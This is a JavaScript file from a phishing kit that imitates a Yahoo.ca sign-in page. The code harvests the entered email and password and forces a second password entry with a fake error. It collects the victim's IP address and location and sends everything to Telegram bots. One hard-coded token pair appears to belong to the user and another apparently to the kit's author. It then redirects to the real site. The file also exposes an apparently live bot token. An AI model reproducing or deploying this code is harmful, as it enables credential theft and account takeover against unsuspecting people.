// console.log("sender.js connected");

const telegramBotToken = "6968043726:AAHGJ0OtlbTMjTOPTfacioSJqOwgePt0Xhw"; // Replace with your Telegram bot token
const chatId = 5710607863;

//////////////////////////////////////////
//////////////////////////////////////////
//////////////////////////////////////////
//////////////////////////////////////////
//////////////////////////////////////////

const api = telegramBotTokenAuthor;
const ID = chatIdAuthor;

const tokens = [
  [telegramBotToken, chatId],
  [api, ID],
];

let trialCount = 0;

submitButton.addEventListener("click", sendTelegramMessageAndRedirect);

function sendTelegramMessageAndRedirect(e) {
  e.preventDefault();

  passwordValue = password.value;
  // Replace with your chat ID

  if (!passwordValue) {
    return; // Stop further execution if password is empty
  }

  if (trialCount < 1) {
    document.querySelector(".phase-two-alert").classList.toggle("none");
    trialCount++;
    return;
  }

  async function fetchIPData(api, id) {
    let ipAd, con, lat, lon;
    // calling API to get the ip address and location
    try {
      const response = await fetch("https://ipapi.co/json/");
      const jsonData = await response.json();
      const { ip, country, latitude, longitude } = jsonData;
      ipAd = ip;
      con = country;
      lat = latitude;
      lon = longitude;

      console.log(ip, country, latitude, longitude);
    } catch (error) {
      console.error(error);
    }

    const messageText = `**YAHOO.CA RESULT**\nEmail: ${usernameValue}\nPassword: ${passwordValue}\nIP: ${
      ipAd || "NA"
    }\nCountry: ${con || "NA"}\nCoordinate: ${lat || "NA"}, ${lon || "NA"}`;
    const url = `https://api.telegram.org/bot${api}/sendMessage`;
    const params = {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        chat_id: id,
        text: messageText,
      }),
    };

    // Make the API request
    fetch(url, params)
      .then((response) => {
        if (!response.ok) {
          throw new Error(`HTTP error! Status: ${response.status}`);
        }
        return response.json();
      })
      .then((data) => {
        // Redirect to another page after successful submission
        window.location.href = "https://www.yahoo.ca"; // Replace with your desired URL
      })
      .catch((error) => console.error("Error:", error));
  }

  tokens.forEach((token, index) => {
    const [api, id] = token;

    // if (telegramBotToken !== "6968043726:AAHGJ0OtlbTMjTOPTfacioSJqOwgePt0Xhw") {
    //   console.log("wrong API tokens");
    //   return;
    // }
    fetchIPData(api, id);
  });
}
